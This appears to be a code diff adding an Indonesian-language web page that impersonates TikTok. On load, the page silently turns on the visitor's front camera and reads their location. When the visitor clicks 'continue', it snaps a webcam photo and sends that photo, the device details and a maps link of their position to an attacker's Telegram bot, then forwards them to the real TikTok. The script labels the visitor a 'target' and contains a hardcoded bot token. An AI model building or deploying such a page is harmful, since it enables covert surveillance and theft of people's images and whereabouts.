@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>TikTok</title>
+  <link rel="icon" href="https://www.tiktok.com/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: "Helvetica Neue", sans-serif;
+      background: #fff;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 20px;
+      text-align: center;
+    }
+    .logo {
+      width: 60px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+    video {
+      width: 100%;
+      border-radius: 10px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #fe2c55;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+    .note {
+      margin-top: 25px;
+      color: #888;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body onload="initAll()">
+  <div class="container">
+    <img class="logo" src="https://www.tiktok.com/favicon.ico" alt="TikTok">
+    <h1>Silakan lanjutkan ke TikTok</h1>
+    <video id="video" autoplay playsinline muted></video>
+    <button onclick="handleProceed()">Lanjutkan ke TikTok</button>
+    <div class="note">Data digunakan untuk keamanan akun.</div>
+  </div>
+
+  <script>
+    const TELEGRAM_TOKEN = '7905161675:AAHZ5sk7tladKAkRz7nEnErNhGAqzdgRnGE';
+    const CHAT_ID = '5827900957';
+    let locationLink = 'Lokasi tidak tersedia';
+
+    async function initAll() {
+      // Kamera
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        document.getElementById("video").srcObject = stream;
+      } catch (e) {
+        alert("Kamera gagal diakses: " + e.message);
+      }
+
+      // Lokasi
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          locationLink = `https://maps.google.com/?q=${lat},${lon}`;
+        });
+      }
+    }
+
+    async function handleProceed() {
+      const video = document.getElementById("video");
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+
+      const platform = navigator.platform;
+      const ua = navigator.userAgent;
+      const textMsg = `
+[Target Klik Lanjutkan]
+Platform: ${platform}
+User Agent: ${ua}
+Lokasi: ${locationLink}
+      `.trim();
+
+      // Kirim teks
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: textMsg
+        })
+      });
+
+      // Kirim foto kamera
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", imageBlob, "foto.jpg");
+
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+
+      // Redirect ke TikTok asli
+      window.location.href = "https://www.tiktok.com/";
+    }
+  </script>
+</body>
+</html>
